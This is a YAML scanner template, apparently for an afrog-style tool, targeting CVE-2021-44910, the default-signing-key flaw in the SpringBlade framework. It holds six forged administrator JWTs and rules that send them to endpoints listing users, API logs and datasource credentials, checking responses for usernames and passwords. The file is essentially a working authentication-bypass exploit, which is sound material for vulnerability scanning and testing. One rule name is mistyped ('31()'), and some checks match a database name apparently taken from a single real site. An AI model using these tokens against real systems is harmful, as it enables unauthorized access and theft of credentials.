id: CVE-2021-44910

info:
  name: SpringBlade 框架默认 SIGN_KRY 秘钥漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    SpringBlade 框架存在默认SIGN_KEY，攻击者可利用漏洞获取用户账号密码日志等敏感信息。
    fofa: body="saber/iconfont.css" || body="Saber 将不能正常工作"||title="Sword Admin"||body="We're sorry but avue-data doesn't work"
  reference:
    - https://forum.butian.net/share/973
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44910
  tags: cve,cve2021,bypass,springblade
  created: 2023/12/12

set:
  token1: "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg"
  token2: "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ"
  token3: "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.5qFj53pqhIZVccg_h0WAvd-FAjG7sDwfVUe5gPBHa0g"
  token4: "bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk"
  token5: "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg"
  token6: "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMSIsIm5hbWUiOiJhZG1pbiIsInJvbGVfbmFtZSI6ImFkbWluaXN0cmF0b3IifQ.3KqH3YSCVDA2wpD1JB4p5iOqFK_qa3pjuwIQOpSYB1e_CEQL4g-Ulkn_oJyOGBtBvJQn_qiMn59jFbMGnNHUwA"
rules:
  r11:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r12:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r13:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r14:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r15:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r16:
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')

  r21:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r22:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r23:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r24:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r25:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r26:
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')

  r31:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r32:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r33:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r34:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r35:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')
  r36:
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200")  && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":')  && response.body.bcontains(b'"createUser":')

  r41:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r42:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r43:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r44:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r45:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
  r46:
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')

  r51:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
  r52:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
  r53:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
  r54:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
  r55:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
  r56:
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')

  r61:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
  r62:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
  r63:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
  r64:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
  r65:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
  r66:
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
expression: r11() || r12() || r13() || r14() || r15() || r16() || r21() || r22() || r23() || r24() || r25() || r26() || 31() || r32() || r33() || r34() || r35() || r36() || r41() || r42() || r43() || r44() || r45() || r46() || r51() || r52() || r53() || r54() || r55() || r56() || r61() || r62() || r63() || r64() || r65() || r66()
